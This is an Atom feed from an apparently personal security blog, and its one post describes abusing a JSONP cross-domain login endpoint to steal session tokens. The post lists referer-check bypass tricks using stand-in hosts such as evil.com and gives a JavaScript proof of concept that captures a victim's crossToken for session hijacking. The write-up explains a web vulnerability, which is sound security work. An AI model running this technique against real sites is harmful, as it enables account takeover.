<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-07-04T00:41:21-07:00</updated><id>http://localhost:4000/</id><title type="html">1hack0.github.io</title><author><name>Richard Cao</name></author><entry><title type="html">Abusing JSONP to grab user credentials</title><link href="http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html" rel="alternate" type="text/html" title="Abusing JSONP to grab user credentials" /><published>2018-07-04T00:00:00-07:00</published><updated>2018-07-04T00:00:00-07:00</updated><id>http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials</id><content type="html" xml:base="http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html">&lt;p&gt;I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /api/cross/getsign?callback=test HTTP/1.1
Host: portal.domain.com
Referer: http://www.otherdomain.com

HTTP/1.1 200 OK
test(crossToken)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /api/cross/getsign HTTP/1.1
Host: www.otherdomain.com

crossToken=[crossToken]

HTTP/1.1 200 OK
set-cookie: session=xxxxxxxxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The company prevents the JSONP injection via referer check.&lt;/p&gt;

&lt;p&gt;some common referer check  byapss tricks:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;notdomian.com&lt;/li&gt;
  &lt;li&gt;domain.com.evil.com&lt;/li&gt;
  &lt;li&gt;evil.com/domain.com&lt;/li&gt;
  &lt;li&gt;send a blank referer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Fortunately, I can bypass it using nototherdomain.com. Then  I buy it and host the malicious code there. So, I can steal the victimsâ€™ crossToken and hijack their session.&lt;/p&gt;

&lt;p&gt;POC:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
function test(data) {
    var crossToken = data;
    document.write('crossToken=' + encodeURIComponent(crossToken));
}
&amp;lt;/script&amp;gt;
&amp;lt;script src=&quot;http://portal.domain.com/api/cross/getsign?callback=test&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Further reading:
&lt;a href=&quot;https://securitycafe.ro/2017/01/18/practical-jsonp-injection/&quot;&gt;Practical JSONP Injection&lt;/a&gt;&lt;/p&gt;</content><author><name>Richard Cao</name></author><summary type="html">I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow: ``` GET /api/cross/getsign?callback=test HTTP/1.1 Host: portal.domain.com Referer: http://www.otherdomain.com</summary></entry></feed>